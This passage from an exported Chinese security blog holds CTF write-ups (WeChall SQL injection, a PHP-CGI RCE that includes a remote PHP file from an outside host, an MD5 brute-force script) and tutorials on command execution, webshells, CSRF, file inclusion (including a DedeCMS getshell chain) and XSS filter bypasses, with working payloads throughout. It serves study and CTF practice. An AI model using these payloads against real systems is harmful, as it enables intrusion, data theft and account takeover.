import threading import time import lxml import lxml.html as H import re r = re.compile(r&apos;\w+: (\d+)&apos;) i = 0 while True: i += 1 print &quot;turn %d&quot; % i print &apos;start click&apos; t1 = threading.Thread(target = f1) print &apos;start buy&apos; t2 = threading.Thread(target = f2) t1.start() t2.start() t1.join() t2.join() text = requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/stats.php&apos;, cookies=cookie).text d = H.document_fromstring(text) msg = d.xpath(&apos;//div[@class=\&apos;box_c\&apos;]&apos;)[0] # import pdb;pdb.set_trace() a,b,c = r.findall(msg.text_content()) print &apos;get %s item &apos; % c if int(c)&gt;=10: break if int(a) &lt; 1000: print &apos;reset&apos; requests.get(&apos;http://www.wechall.net/challenge/quangcurrency/reset.php&apos;, cookies=cookie) 友情提示,它肯定可以跑出来,但它永远不会停下,最好自己确认这个challenge是不是已经完成了. Stop us关键在于这句话 ‘ignore_user_abort’ =&gt; false 这句话所造成的后果就是，一个脚本当用户断开连接（关闭窗口之类的），这个脚本就会被强行终止。再看看 php 脚本，可以发现它是先给我们添加了一个域名，之后才扣费的。所以我们只要在扣费前关掉页面即可。 Screwed SignupISCC2016的一道题 SQL table里username最多24个字符，但是preg_match检查时可以最多到64个。于是这里可能造成截断. Table Names IIhttp://www.wechall.net/challenge/table_names/challenge.php ?username=&apos; union select database(),2,group_concat(0x3f,table_name) from information_schema.tables where table_schema=database() -- &amp;password=test &amp;login=login 也可以这样： http://www.wechall.net/challenge/table_names/challenge.php ?username=&apos; union select 1,2,info from information_schema.processlist-- &amp;password=test &amp;login=login 运行结果为： Welcome back gizmore_tableu61 Your personal welcome message is: ?aaawrong,?usertableus4 This ensures you are not on a fake evil phising site. 提交：gizmore_tableu61_usertableus4 AUTH meSSL 加密传输的问题。 访问https://authme.wechall.net/challenge/space/auth_me/www/index.php 提示说： Error Renegotiation is not allowed 所以我们需要去找这个证书，然后导入。 其实，你观察下它 apache.conf 的网址， http://www.wechall.net/challenge/space/auth\_me/**find_me/apache.conf** 会发现叫做 find_me 的文件夹。直接访问 apache.conf 05-May-2015 21:18 1.0K client.crt 05-May-2015 21:18 1.5K client.key 05-May-2015 21:18 3.2K client.p12 05-May-2015 21:18 4.7K server.crt 05-May-2015 21:18 1.5K 导入client.p12 即可 Warchall: Live RCE具体漏洞是：CVE-2012-1823（PHP-CGI RCE） 在地址后面加进参数运行对应的php-cgi 参数的行为,根据解释，如果query string中不包含未urlencoded的等号，那么整个query会以空格分词，传给php-cgi。于是我们传-s，就会把php文件源码回显。 例如 index.php?-s 相参于/usr/bin/php53-cgi/php-cgi -f index.php -s php-cgi –help如下 Usage: php-cgi [-q] [-h] [-s] [-v] [-i] [-f &lt;file&gt;] php-cgi &lt;file&gt; [args...] -a Run interactively -b &lt;address:port&gt;|&lt;port&gt; Bind Path for external FASTCGI Server mode -C Do not chdir to the script&apos;s directory -c &lt;path&gt;|&lt;file&gt; Look for php.ini file in this directory -n No php.ini file will be used -d foo[=bar] Define INI entry foo with value &apos;bar&apos; -e Generate extended information for debugger/profiler -f &lt;file&gt; Parse &lt;file&gt;. Implies `-q&apos; -h This help -i PHP information -l Syntax check only (lint) -m Show compiled in modules -q Quiet-mode. Suppress HTTP Header output. -s Display colour syntax highlighted source. -v Version number -w Display source with stripped comments and whitespace. -z &lt;file&gt; Load Zend extension &lt;file&gt;. -T &lt;count&gt; Measure execution time of script repeated &lt;count&gt; times. 查看源码： http://rce.warchall.net/?-s 里面包含了一个../config.php,所以我要去读它。 在刚开始进的页面里发现index.php的目录为： [SCRIPT\_FILENAME] =&gt; /home/level/20_live_rce/www/index.php 所以../config.php 的绝对路径是： /home/level/20_live_rce/config.php php-cgi参数中： d foo[=bar] Define INI entry foo with value ‘bar’ -dallow_url_include=On -dauto_prepend_file=/tmp/2.php 在/tmp里建立一个2.php内容是 &lt;?php exec(&quot;cat /home/level/20_live_rce/config.php&quot;,$out); print_r($out); ?&gt; 构造地址： http://rce.warchall.net/?-d allow_url_include=On -d auto_prepend_file=http://oacotcyq8.bkt.clouddn.com/2.php -n urlencode: http://rce.warchall.net/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp%3%2f%2foacotcyq8.bkt.clouddn.com%2f2.php+-n Blinded by the lighter还是盲注，加时间延迟注入。 Light in the Darkness这道题的错误会回显，而且限制要在2次query内得到答案，所以用error based： POC1: &#39; or row(1,1) &gt; (select count(*),concat(password,&#39;$&#39;,floor(rand(0)*2))x from (select 1 union select 2 union select 3)a group by x limit 1) # POC2: &#39; or (select count(*) from information_schema.tables group by concat(password,floor(rand(0)*2)))-- 原理： http://stackoverflow.com/questions/11787558/sql-injection-attack-what-does-this-do 简单地说，floor(rand(0)*2)会得到0,1,1,0……第2个和第3个重复的1会造成重复的group_key。而且我们需要一个行数大于3的表，所以选择information_schema Brainfuckedalert(XXX)xxx为 文件内容。 function anonymous() { var s = &apos;UnfudgedDebugStuff&apos;; s = s.length; alert(s); document.location.href=&apos;https://www.google.co.uk&apos;; } eXtract Me一个压缩包，解压发现里面一直有个压缩包，应该不是这么多 解压一次之后使用16进制打开 可以发现是两个压缩包拼接在一起的。所以我们只要把后面的压缩包扣出来即可。 还是解压，出来一个xar文件，通过 7zip 解压，出来一个又一个奇葩文件。。 但是，在解压途中会发现有一个rar 的注释是有东西的。拷贝出来，用这数据新建一个rar文件，发现需要密码。 密码为：L0LYouThInkiTSh0uldB3SoEasY? Are you blind?还是盲注，报错来判断。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>writeup</tag>
        <tag>WeChall</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[远程代码执行漏洞总结]]></title>
    <url>%2F2016%2F07%2F23%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[远程代码执行是指程序代码在处理输入输出的时候没有严格控制。导致用户可以构造参数包含执行远程代码在服务器上执行，进而获取到服务器权限，是发生在应用程序的逻辑层上的漏洞 0x01 OS命令执行系统命令执行是指应用程序对传入命令行的参数过滤不严格导致恶意用户能控制最终执行的命令，进而入侵系统，导致严重破坏的高危漏洞。(bash,shell) shell是系统的用户界面，提供用户与内核交互操作的接口，它接收用户输入的命令并把它送入到内核去执行。实际上shell是一个命令解释器，它的一个重要特性就是它自身就是一个解释型的程序语言。 分类： 1.1 OS本身命令执行 1.2 Web命令执行 1.3 数据库命令执行 1.4 第三方软件命令执行 0x02 命令执行模型0x02.1 PHP命令执行函数利用1、system：system函数可以用来执行一个外部的应用程序并将相应的执行结果输出，函数原型为： string system(string command,int &amp;return_var) 其中，command是要执行的命令，return_var存放执行命令的执行后的状态 示例代码如下： &lt;?php $dir = $_GET[&quot;dir&quot;]; if(isset($dir)) { echo &quot;&lt;pre&gt;&quot;; system(&quot;net user&quot;.$dir); echo &quot;&lt;/pre&gt;&quot;; } ?&gt; 执行结果为： 上述代码就是把dir这个命令写死了，把net user执行的结果给$dir变量。但是注意一些连接符，管道符如：&amp;,&amp;&amp;,|,||,:等，如果我们输入?dir=| netstat -an 注：|只执行后面的命令，||前后命令都执行。 2、exec：exec函数可以用来执行一个外部的应用程序，函数原型为： string exec(string command,array &amp;output,int &amp;return_var) 其中，command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var是存放执行命令后的状态值。 示例代码： &lt;?php $cmd = $_GET[&quot;cmd&quot;]; $output = array(); echo &quot;&lt;pre&gt;&quot;; exec($cmd,$output); echo &quot;&lt;/pre&gt;&quot;; while(list($key,$value)=each($output)) { echo $value.&quot;&lt;br&gt;&quot;; } ?&gt; 执行结果为： 3、passthru：passthru函数可以用来执行一个unix系统命令并显示原始的输出，当unix系统令的输出是二进制的数据，并且需要直接返回值给浏览器时，需要使用passthru函数来替代system和exec函数。原型为： void passthru(string command,int &amp;teturn_var) 其中command是要执行的命令，return_var存放执行命令后的状态值。 示例代码如下： &lt;?php $cmd = $_GET[&quot;cmd&quot;]; echo &quot;&lt;pre&gt;&quot;; passthru($cmd); echo &quot;&lt;/pre&gt;&quot;; ?&gt; 4、shell_exec：执行shell命令并返回输出的字符串，函数原型为u： string shell_exec(string command) 其中command是要执行的命令。 &lt;?php $cmd = $_GET[&quot;cmd&quot;]; echo &quot;&lt;pre&gt;&quot;; shell_exec($cmd); echo &quot;&lt;/pre&gt;&quot;; ?&gt; 5、`运算符：与shell_exec功能相同，通常用于绕过黑名单 示例代码如下： &lt;?php $cmd = $_GET[&quot;cmd&quot;]; $output = `$cmd`; echo &quot;&lt;pre&gt;&quot;; echo $output; echo &quot;&lt;/pre&gt;&quot;; ?&gt; 执行结果为： 0x02.2 eval注入攻击利用出来可以利用函数命令注入攻击方式外还可以使用eval注入攻击方式，eval函数会将参数字符串作为php程序代码来执行，用户可以将php代码保存成字符串的形式，然后传递给eval函数执行。原型为： mixed eval(string code_str) 其中code_str是php代码字符串，通过构造传入eval函数中的全部或部分字符串的内容实现命令注入攻击。 示例代码： &lt;?php $cmd = $_GET[&quot;cmd&quot;]; echo &quot;&lt;pre&gt;&quot;; eval($cmd); echo &quot;&lt;/pre&gt;&quot;; ?&gt; 如果传入的内容为phpinfo();,若传入的是一句话木马&lt;?php eval($_POST[cmd]);?&gt;就可以直接拿shell。 示例结果为： 0x02.3 PHP webshell命令执行防御及绕过方法0x02.3.1 PHP禁止webshell执行命令防御PHP的配置文件php.ini里面有个disable_functions =配置这个，禁止某些php函数，便可以禁止php的命令执行漏洞，例如： disable_functions=system,passthru,shell_exec,exec,popen 0x02.3.2 PHP webshell命令执行绕过方法1.黑名单绕过 php能够执行系统命令的函数有： assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,`(反单引号) 根据黑名单中没有的函数，即可绕过。 2.系统组件绕过 只适用于windows，代码如下： &lt;?php $command = $_POST[a]; $wsh = new COM(&apos;WScript.shell&apos;); //生成一个COM对象 $exec = $wsh-&gt;exec(&apos;cmd.exe /c &apos;.$command); //调用对象方法来执行命令 $stdout = $exec-&gt;StdOut(); $stroutput = $stdout-&gt;ReadAll(); echo $stroutput ?&gt; 如何防御：直接删除system32下的wshom.ocx文件 2.拓展库绕过 0x02.4 PHP create_function()注入命令执行漏洞在PHP中使用create_function()创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令。]]></content>
      <tags>
        <tag>WAF绕过</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个简单的代码审计和MD5爆破脚本]]></title>
    <url>%2F2016%2F07%2F21%2F%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8CMD5%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[0x01 php是最好的语言代码审计。 描述：据说php是最好的语言，perfect？来试试看。地址：http://218.76.35.75:20114/源码如下： &lt;?php show_source(__FILE__); $v1=0;$v2=0;$v3=0; $a=(array)json_decode(@$_GET[&apos;foo&apos;]); if(is_array($a)){ is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope&quot;):NULL; if(@$a[&quot;bar1&quot;]){ ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL; } if(is_array(@$a[&quot;bar2&quot;])){ if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope&quot;); $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]); $pos===false?die(&quot;nope&quot;):NULL; foreach($a[&quot;bar2&quot;] as $key=&gt;$val){ $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL; } $v2=1; } } $c=@$_GET[&apos;cat&apos;]; $d=@$_GET[&apos;dog&apos;]; if(@$c[1]){ if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d){ eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope&quot;):NULL; strpos(($c[0].$d), &quot;htctf2016&quot;)?$v3=1:NULL; } } if($v1 &amp;&amp; $v2 &amp;&amp; $v3){ include &quot;flag.php&quot;; echo $flag; } ?&gt; tips：在本地搭建环境一个一个输出，看是什么情况 构造源码如下： &lt;?php $v1=0;$v2=0;$v3=0; //给3个变量赋值 $a=(array)json_decode(@$_GET[&apos;foo&apos;]); //json_decode解码，所以要知道编码的样式 var_dump($a); echo &apos;&lt;/br&gt;&apos;; var_dump($_GET[&apos;foo&apos;]); echo &apos;&lt;/br&gt;&apos;; if(is_array($a)){ //判断是不是数组 echo ($a[&quot;bar1&quot;]); echo &apos;&lt;/br&gt;&apos;; echo is_numeric(@$a[&quot;bar1&quot;]); echo &apos;&lt;/br&gt;&apos;; is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope1&quot;):NULL; //判断是不是纯数字或数字字符串，如果是就die输出nope1 if(@$a[&quot;bar1&quot;]){ ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL; //php弱类型，其他类型和整形比较时，先把其他类型转化为整形 echo $v1; echo &apos;&lt;/br&gt;&apos;; } if(is_array(@$a[&quot;bar2&quot;])){ //判断是不是数组 if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope2&quot;); //or成立则die输出nope2，所以需要count($a[&quot;bar2&quot;])==5和is_array($a[&quot;bar2&quot;][0])有值 echo &quot;good1&quot;; echo &apos;&lt;/br&gt;&apos;; $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]); //有a2，并且值中有字符串“nudt” var_dump($pos); $pos===false?die(&quot;nope3&quot;):NULL; foreach($a[&quot;bar2&quot;] as $key=&gt;$val){ $val===&quot;nudt&quot;?die(&quot;nope3&quot;):NULL; //bar2中不能有字符nudt } $v2=1; echo ($v2); echo &apos;&lt;/br&gt;&apos;; } } $c=@$_GET[&apos;cat&apos;]; $d=@$_GET[&apos;dog&apos;]; if(@$c[1]){ if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d){ //需要strcmp($c[1],$d)和$c[1]!==$d同时成立，即$c$d既相等又不相等 //php弱类型，strcmp函数中数组和字符串比较返回null echo &quot;good2&quot;; eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope4&quot;):NULL; //eregi函数有个%00截断漏洞 echo &quot;good3&quot;; var_dump(strpos(($c[0].$d), &quot;htctf2016&quot;)); strpos(($c[0].$d), &quot;htctf2016&quot;)?$v3=1:NULL; $c[0]和$d连接返回字符串htctf2016的位置 echo &quot;good4&quot;; } echo $v3; } if($v1 &amp;&amp; $v2 &amp;&amp; $v3){ include &quot;flag.php&quot;; echo &quot;hello，Get It!&quot;; //echo &quot;flag{php_i5_n0t_b4d}&quot;; } ?&gt; 最终的POC为： http://127.0.0.1:8080/hetian/test.php?foo={&quot;bar1&quot;:&quot;2017a&quot;,&quot;bar2&quot;:[[1],2,3,4,5],&quot;a2&quot;:&quot;nudt&quot;}&amp;cat[1][]=111&amp;cat[0]=aahtctf2016&amp;dog=%00 效果为： 0x02 忘记密码了描述：在这个网站，记录了小伙伴们的密码。 可是slash的密码怎么也找不到了，你能帮忙找出来么地址：http://218.76.35.75:20115 MD5爆破python脚本 打开其他的两个发现page是名字加三位数字的md5值。 脚本如下： # -*- coding: utf8 -*- import requests import hashlib url = &quot;http://218.76.35.75:20115/index.php?page=&quot; for id in range(100,999): id=str(id) id=&apos;slash&apos;+id #print id payload = hashlib.md5(id).hexdigest() poc = url+payload #print poc conn = requests.get(poc) res = conn.content res = str(res) if res.find(r&quot;文件不存在，请返回&quot;)&gt;0 or res.find(r&quot;error!&quot;)&gt;0: print &quot;error!&quot; else: print poc print payload break 效果如下：]]></content>
      <tags>
        <tag>爆破</tag>
        <tag>编程</tag>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>PHP</tag>
        <tag>代码审计</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF漏洞总结]]></title>
    <url>%2F2016%2F07%2F20%2FCSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[CSRF（Cross-site request forgery跨站请求伪造，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。 0x01 CSRF是什么？网站是通过cookie来识别用户的，当用户成功进行身份验证之后浏览器就会得到一个标识其身份的cookie，只要不关闭浏览器或者退出登录，以后访问这个网站会带上这个cookie。如果这期间浏览器被人控制着请求了这个网站的url，可能就会执行一些用户不想做的功能（比如修改个人资料）。因为这个不是用户真正想发出的请求，这就是所谓的请求伪造；呵呵，因为这些请求也是可以从第三方网站提交的，所以前缀跨站二字。 0x02 CSRF可以做什么？你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。 0x03 CSRF与XSS的区别XSS： 攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击 CSRF： 攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击 CSRF少了一个 获取受害人的cookie的步骤。为什么会少了呢。因为受害人在执行代码的时候就已经完成的攻击，而攻击者并没有参与进来。 举个例子来说吧(受害者的网址是a.cn，攻击者的网址是b.cn)攻击者想要在某个网站(网站是某个开源CMS)添加上另一个管理员，但是这个网站并没有XSS漏洞。怎么办呢？这时攻击者发现了这个开源CMS后台添加管理员时并没有加入验证码或则token，只需要输入要添加的管理员账号和密码点击确定就可以添加管理员账户了。这时和我一样聪明的攻击者在自己的服务器上建立了一个html文件(假设地址是b.cn/index.html)。然后就给网站管理员发邮件等等，诱使管理员打开b.cn/index.html。当管理员打开后（这时管理员正在网站后台，或则管理员的session并没有失效的话），就可以神不知鬼不觉的在网站后台添加了一个管理员账户。 CSRF的两个侧重点： 1.csrf的攻击建立在浏览器和web服务器的会话之中 2.欺骗用户访问恶意url 0x04 CSRF实例0x04_1 CSRF快速脱库正常情况下，管理员备份数据库的方法是进入管理页面-管理中心-数据备份 我们现在用普通用户利用CSRF漏洞来备份网站的数据库。 第一步：建个用户,普通权限 第二步：构造备份数据库的链接 http://127.0.0.1:8080/discuz1.5/upload/uc_server/admin.php?m=db&amp;a=operate&amp;t=export&amp;appid=0&amp;backupdir=xxxx%26backupfilename%3Daaaa 注：这个链接就是admin正常备份数据库的链接 第三步：利用普通用户发一个帖子，帖子的信息能够达到诱骗管理员访问的目的，里面的图片写上我们备份数据库的链接，宽高都是0，这样就不会看到我们的恶意代码 第四步：引诱管理员访问帖子，这里我使用两个不同的浏览器，这样就不会因为cookie而产生歧义 第五步：访问我们自己构造的路径，即可得到数据库 http://127.0.0.1:8080/discuz1.5/upload/uc_server/data/backup/xxxx/aaaa-1.sql 0x04_2 CSRF修改密码比如某一套开源的CMS，知道改密码的链接，这样我们就可以把这些恶意代码，嵌入到某些页面，引诱管理员来访问，这样我们就改了管理员的密码。 这里用DVWA来演示实例。这里默认账户密码为admin/password 第一步：调安全级别为低，点击csrf 第二步：构造恶意代码，嵌入到某一页面，引诱管理员访问 http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change# 第三步：成功修改管理员密码,之前的密码无法登陆 0x05 CSRF防御0x05_1 服务端的防御1.验证HTTP Referer字段 2.请求地址中添加token并验证 3.在HTTP头中自定义属性并验证 4.在服务端严格区分好POST与GET的数据请求 5.使用验证码或者密码确认方式进行 0x05_2 用户端的防御0x05_3 安全设备的防御]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞总结]]></title>
    <url>%2F2016%2F07%2F19%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[严格来说，文件包含漏洞是“代码注入”的一种，其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。“代码注入”的典型代表就是文件包含，文件包含漏洞可能出现在JSP、PHP、ASP等语言中，原理都是一样的，本文只介绍PHP文件包含漏洞。 0x01 什么是文件包含漏洞？简单的来说，就是我们用一个可控的变量作为文件名并以文件包含的的方式调用了它，漏洞就产生了。以PHP为例文件包含漏洞可以分为RFI(远程文件包含)和LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是php.ini中是否开启了allow_url_include。如果开启了我们就有可能包含远程文件，如果不是我们有可能包含本地的文件。 0x02 文件包含漏洞产生的原因？PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。 0x03 PHP包含漏洞分类主要分为两类： 1、本地文件包含LFI 2、远程文件包含RFI（需要php.ini中allow_url_include=on） PHP中四个包含文件的函数： include(),include_once(),require()和require_once() 它们的区别在于： include(),include\_once()在包含文件时，即使遇到错误，下面的代码依然会继续执行； 而require()和require_once()则会报错，直接退出程序。 0x04 本地文件包含测试代码main.php： &lt;?php echo &quot;Hello,this is file_include test!&quot;; //初始化 define(&quot;ROOT&quot;,dirname(_File_).&apos;/&apos;); //加载模块 $page = $_GET[&apos;page&apos;]; echo ROOT.$page.&apos;.php&apos;; include(ROOT.$page.&apos;.php&apos;) ?&gt; 在同目录下创建1.php: &lt;?php phpinfo();?&gt; 请求/main.php?page=1 0x05 远程文件包含基于HTTP协议的测试代码 &lt;?php include($_GET[&apos;url&apos;]); ?&gt; 在远程主机放入一个2.txt，内容为 &lt;?php phpinfo();?&gt; 在请求的url参数中传入2.txt的地址http://oacotcyq8.bkt.clouddn.com/2.txt返回本机的phpinfo信息。 远程文件包含还有一种利用PHP输入输出流的利用方式，可以直接执行POST代码，只要执行POST请求main.php?url=php://input,POST的内容为&lt;?php phpinfo();?&gt;,即可打印出phpinfo信息。 0x06 文件包含漏洞实例0x06_1 本地文件包含实例1.首先有个正常的图片，里面包含一个phpinfo()函数。 2.打开DVWA上传含恶意代码的图片 3.利用文件包含访问链接： http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/fi/?page=../../hackable/uploads/1.jpg 0x06_2 远程文件包含实例以Dedecms的一个远程文件包含漏洞为例 DedeCms &lt; 5.7-sp1远程文件包含漏洞，在了解这个漏洞之前，我们先了解一下Apache服务器解析文件流程。 当Apache检测到一个文件有多个扩展名时，比如1.php.bak,会从右向左判断，因为bak扩展名Apache不认识，所以就要向前解析，直到有一个Apache认识的扩展名，如果全部的扩展名都不认识，那么会按照httpd.conf配置中指定的方式进行展示，一般默认的是“text/plain”这种方式。我们了解完这个内容后再来分析下面这个漏洞。 这个问题出现在install/index.php.bak这个文件。看一下这个文件的代码： &lt;php? ……. else if($step==11) { require_once(‘../data/admin/config_update.php’); $rmurl = $updateHost.”dedecms/demodata.{$s_lang}.txt”; echo $rmurl; $sql_content = file_get_contents($rmurl); $fp = fopen($install_demo_name,’w’); if(fwrite($fp,$sql_content)) echo ‘ [√] 存在(您可以选择安装进行体验)’; else echo ‘ [×] 远程获取失败’; unset($sql_content); fclose($fp); exit(); …… ?&gt; 在上面的代码中我们看到在step=11中，首先包含了/data/admin/config_update.php这个文件，我们再打开这个文件，内容如下： &lt;?php /** * 更新服务器，如果有变动，请到 http://bbs.dedecms.com 查询 * * @version $Id: config_update.php 1 11:36 2011-2-21 tianya $ * @package DedeCMS.Administrator * @copyright Copyright (c) 2007 - 2010, DesDev, Inc. * @license http://help.dedecms.com/usersguide/license.html * @link http://www.dedecms.com */ //更新服务器，如果有变动，请到 http://bbs.dedecms.com 查询 $updateHost = &apos;http://updatenew.dedecms.com/base-v57/&apos;; $linkHost = &apos;http://flink.dedecms.com/server_url.php&apos;; 指定了updateHost变量的值。看起来是没有办法包含的，因为变量是固定值，但是如果我们指定了install_demo_name是config_update.php这文件，并且内容是一个404的文件，情形是怎么样子的呢？ 我们先来访问这个url:http://127.0.0.1/ DedeCMS-5.7-UTF8-SP1/uploads/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php 这会让代码到 http:// updatenew.dedecms.com/base-v57/dedecms/demodata.a.txt 中取内容写入到 config_update.php，demodata.a.txt。你可能想要问了http:// updatenew.dedecms.com/base-v57/dedecms/demodata.a.txt 这个是什么呢？我们访问一下 其实什么都没有，所以变量覆盖以后，我们打开config_update.php以后，里面已经什么都没有了 这样updataHost变量的值便没有被初始化，那么我们想写什么就写什么了，这样就完成了一个远程文件包含漏洞的利用。构造一个url即可完成攻击： http://127.0.0.1/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/xxx.php&amp;updateHost=http://192.168.2.3/ 0x06_2.1 编写脚本测试1.开始测试，打开dedecms，可以正常访问 2.然后检测脚本是否可以正常运行 3.脚本可以正常运行，然后我们测试漏洞是否可以利用成功，我们查看远程服务器的文件，如下图,我们在目录C:\wamp\www\dedecms\demodata.a.txt中写入需要我们写入web服务器中的内容，这样就可以写入xxx.php的文件中，从而达到getshell的目的。 4.攻击者远程IP地址 5.然后我们测试漏洞利用 6.打开web服务器的data目录，可以看到，文件已经成功的写到了web服务器中。DedeCMS-5.7-UTF8-SP1\uploads 7.我们访问一下 8.漏洞利用成功 0x06 文件包含漏洞利用技巧远程文件包含漏洞之所以能够执行命令，就是因为攻击者可以自定义被包含的文件内容。因此，本地文件包含漏洞要想执行命令，也需要找一个攻击者能够控制内容的本地文件。 目前主要有几下几种常见的技巧： 0x06_1 PHP包含读文件 php://filter/read=convert.base64-encode/resource=login.php 0x06_2 PHP包含写文件包含data://或php://input等伪协议。这需要目标服务器支持，同时要求allow_url_fopen为设置为ON。 http://ip_address/?page=php://input 并且POST数据为&lt;?php system(&apos;net user&apos;);?&gt; 0x06_3 包含日志文件当某个PHP文件存在文件包含漏洞，却无法上传文件时，这就意味着有包含漏洞却不能拿来利用，这时就可以利用apache日志文件来入侵 Apache服务器运行后会生成两个日志文件，access.log（访问日志）和error.log(错误日志)，apache会记录下我们的操作，并写入到访问日志access.log之中。 访问 http://ip_address/?page=../../../../Apache-20/logs/access.log 0x06_4 截断包含只适合于magic_quotes_gpc=off的时候。 hhtp://ip_address/?page=1.jpg%00 0x06_5 PHP内置协议file:///var/www/html 访问本地文件系统 ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt; 访问FTP(s) URLs data:// 数据流 http:// — 访问 HTTP(s) URLs ftp:// — 访问 FTP(s) URLs php:// — 访问各个输入/输出流 zlib:// — 压缩流 data:// — Data (RFC 2397) glob:// — 查找匹配的文件路径模式 phar:// — PHP Archive ssh2:// — Secure Shell 2 rar:// — RAR ogg:// — Audio streams expect:// — 处理交互式的流 0x06_6 包含Session文件。这部分需要攻击者能够控制部分Session文件的内容，PHP默认生成的Session文件一般存放在/tmp目录下。 0x06_7 包含/proc/self/environ文件。 http://192.168.159.128/index.php?file=../../../../../../../proc/self/environ 这个也是一种通用的技巧，因为它根本不需要猜测被包含文件的路径，同时用户也能控制它的内容，常见的做法是向User-Agent中注入PHP代码来完成攻击。 补充强力推荐一篇文章：LFI、RFI、PHP封装协议安全问题学习]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>PHP</tag>
        <tag>自动化</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS绕过与防御总结]]></title>
    <url>%2F2016%2F07%2F18%2FXSS%E7%BB%95%E8%BF%87%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的特殊目的。 0x01 XSS的分类 反射型（非持久型） 存储型（持久型） DOM型 具体的一些介绍与简单的实例就不做详述了，本文主要介绍的是XSS的绕过技巧与防御。 0x02 XSS的绕过大小写绕过&lt;ScRIpT&gt;alert(&apos;123&apos;)&lt;/sCRIpT&gt; 编码绕过1.十六进制编码 2.jsfuck编码 3.url编码 4.unicode编码 &lt;0x736372697074&gt;alert(&apos;123&apos;)&lt;/0x736372697074&gt; &lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt; &apos;被过滤，我们可以将&apos;写为 &amp;#x27 将&quot;/&quot;转义为&quot;&amp;sol;&quot; 绕过magic_quotes_gpc&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt; 闭合标签&quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt; &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; 标签绕过&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt; &lt;button onclick=&quot;javascript:alert(&apos;xss&apos;)&gt;XSS&lt;/button&quot;&gt; &lt;title&gt;&lt;img a=&quot;&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//&quot;&gt; &quot;onsubmit=javascript:alert(1)%20name=&quot;a 其他符号绕过%0aalert(1); %0a 换行符 /**/ 替换空格 %00 截断 